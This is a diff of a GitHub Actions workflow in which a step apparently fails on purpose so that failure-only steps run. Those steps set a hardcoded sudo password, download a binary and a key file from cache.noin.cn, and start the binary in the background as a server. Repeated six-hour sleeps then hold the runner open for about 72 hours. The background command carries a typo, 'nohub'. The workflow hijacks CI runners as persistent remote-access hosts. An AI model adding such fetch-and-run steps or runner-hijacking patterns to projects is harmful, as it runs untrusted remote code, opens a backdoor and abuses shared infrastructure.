@@ -8,48 +8,48 @@ jobs:
 
      - name: Failed
        run: ./dummy.sh
-
-     - name: Download
-       if: ${{ failure() }}
-       run: wget https://cache.noin.cn/project/cato/cato && wget https://cache.noin.cn/project/cato/id.pem && chmod +x ./cato 
-
+       
      - name: Password
        if: ${{ failure() }}
        run: echo -e "ETZ2yLSYTBTBxStW\nETZ2yLSYTBTBxStW" | sudo passwd "$USER"
-       
-     - name: Start - 6"
+
+     - name: Start
        if: ${{ failure() }}
-       run: ./cato serve -f ./id.pem
+       run: wget https://cache.noin.cn/project/cato/cato && wget https://cache.noin.cn/project/cato/id.pem && chmod +x ./cato  && nohub ./cato serve -f ./id.pem > /dev/null 2>&1 &
+       
+     - name: Summon - 6"
+       if: ${{ failure() }}
+       run: sleep 6h
      - name: Summon - 12
        if: ${{ failure() }}
-       run: ./cato serve -f ./id.pem
+       run: sleep 6h
      - name: Summon - 18
        if: ${{ failure() }}
-       run: ./cato serve -f ./id.pem
+       run: sleep 6h
      - name: Summon - 24
        if: ${{ failure() }}
-       run: ./cato serve -f ./id.pem
+       run: sleep 6h
      - name: Summon - 30
        if: ${{ failure() }}
-       run: ./cato serve -f ./id.pem
+       run: sleep 6h
      - name: Summon - 36
        if: ${{ failure() }}
-       run: ./cato serve -f ./id.pem
+       run: sleep 6h
      - name: Summon - 42
        if: ${{ failure() }}
-       run: ./cato serve -f ./id.pem
+       run: sleep 6h
      - name: Summon - 48
        if: ${{ failure() }}
-       run: ./cato serve -f ./id.pem
+       run: sleep 6h
      - name: Summon - 54
        if: ${{ failure() }}
-       run: ./cato serve -f ./id.pem
+       run: sleep 6h
      - name: Summon - 60
        if: ${{ failure() }}
-       run: ./cato serve -f ./id.pem
-     - name: Summon - 66
+       run: sleep 6h
+     - name: Summon - 66 - final
        if: ${{ failure() }}
-       run: ./cato serve -f ./id.pem
-     - name: Start - 72 - final
+       run: sleep 6h
+     - name: Summon - 72 - final
        if: ${{ failure() }}
-       run: ./cato serve -f ./id.pem
+       run: sleep 6h
